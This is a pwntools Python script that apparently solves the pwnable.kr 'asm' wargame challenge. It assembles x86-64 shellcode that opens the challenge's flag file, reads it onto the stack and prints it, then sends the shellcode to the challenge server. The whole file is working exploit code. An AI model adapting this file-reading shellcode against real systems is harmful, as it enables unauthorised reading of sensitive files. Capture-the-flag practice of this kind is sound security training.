```python
from pwn import *

context(arch='amd64', os='linux')

file = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

shellcode =  asm(shellcraft.open(file))
shellcode += asm("mov rdi, rax; xor rax, rax; mov rsi, rsp; mov rdx, 0x100; syscall")
shellcode += asm("mov rax, 1; mov rdi, 1; mov rsi, rsp; mov rdx, 0x100; syscall")

p = remote("pwnable.kr", 9026)

print(p.recv())
p.sendline(shellcode)
p.interactive()
```
